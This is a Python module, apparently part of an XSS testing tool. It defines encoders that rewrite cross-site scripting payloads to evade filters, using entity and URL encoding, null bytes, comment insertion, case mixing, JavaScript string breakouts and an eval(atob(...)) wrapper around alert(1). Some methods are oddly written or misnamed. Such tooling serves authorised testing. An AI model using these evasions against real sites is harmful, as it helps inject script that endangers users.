"""
Encoding utilities for XSS bypass techniques
"""

import urllib.parse
import html
import re
from typing import List, Optional


class Encoder:
    @staticmethod
    def html_encode(payload: str, use_decimal: bool = False) -> str:
        if use_decimal:
            return ''.join(f'&#{ord(c)};' for c in payload)
        else:
            return html.escape(payload, quote=False)

    @staticmethod
    def html_encode_advanced(payload: str) -> List[str]:
        results = []
        for char in payload:
            if char.isalnum():
                results.append(f'&#{ord(char)};')
            else:
                results.append(char)
        results.append(''.join(f'&#{ord(c)};' for c in payload))
        return [''.join(results)]

    @staticmethod
    def url_encode(payload: str) -> str:
        return urllib.parse.quote(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        return ''.join(f'%{ord(c):02x}' for c in payload)

    @staticmethod
    def unicode_escape(payload: str) -> str:
        return payload.encode('unicode_escape').decode('ascii')

    @staticmethod
    def base64_encode(payload: str) -> str:
        import base64
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def case_mix(payload: str) -> str:
        result = []
        upper = True
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if upper else char.lower())
                upper = not upper
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def insert_null_bytes(payload: str) -> List[str]:
        results = []
        results.append(payload + '\x00')
        results.append('\x00' + payload)
        parts = payload.split('<')
        if len(parts) > 1:
            results.append('<'.join([p + '\x00<' if i > 0 else p for i, p in enumerate(parts)]))
        return results

    @staticmethod
    def insert_comments(payload: str) -> List[str]:
        results = []
        results.append(re.sub(r'(<[^>]+>)', r'<!--\1-->', payload))
        results.append(re.sub(r'(script)', r'<\1>', payload.replace('<script>', '<')))
        results.append(payload.replace('<script>', '<script>//'))
        results.append(payload.replace('<script>', '<script><!--'))
        results.append(re.sub(r'(>)', r'/*\1*/', payload))
        comment_positions = [
            (payload.find('<'), '<!--'),
            (payload.find('>'), '-->')
        ]
        if comment_positions[0][0] != -1:
            mixed = payload[:comment_positions[0][0]] + '<!--' + payload[comment_positions[0][0]:]
            if comment_positions[1][0] != -1:
                mixed = mixed[:comment_positions[1][0]+4] + '-->' + mixed[comment_positions[1][0]+4:]
                results.append(mixed)
        return results

    @staticmethod
    def split_by_null_byte(payload: str) -> str:
        return '<'.join(f'{c}\x00' if i > 0 else c for i, c in enumerate(payload.split('<')))

    @staticmethod
    def unicode_js_escape(payload: str) -> str:
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

    @staticmethod
    def obfuscate_with_math(payloaad: str) -> str:
        alert_patterns = [
            ("alert(1)", "eval(atob('YWxlcnQoMSk='))"),
            ("alert('xss')", "eval(atob('YWxlcnQoJ3hzcycp'))"),
        ]
        result = payloaad
        for pattern, replacement in alert_patterns:
            result = result.replace(pattern, replacement)
        return result

    @staticmethod
    def encode_for_attribute_context(payload: str) -> List[str]:
        results = []
        results.append(payload)
        results.append(payload.replace('"', '&quot;'))
        results.append(payload.replace("'", '&#39;'))
        results.append(payload.replace('<', '&lt;'))
        results.append(payload.replace('>', '&gt;'))
        return results

    @staticmethod
    def encode_for_javascript_context(payload: str) -> List[str]:
        results = []
        results.append(f"'{payload}'")
        results.append(f'"{payload}"')
        results.append(f"';{payload};//")
        results.append(f'";{payload};//')
        results.append(payload.replace('alert', '\\u0061lert'))
        return results
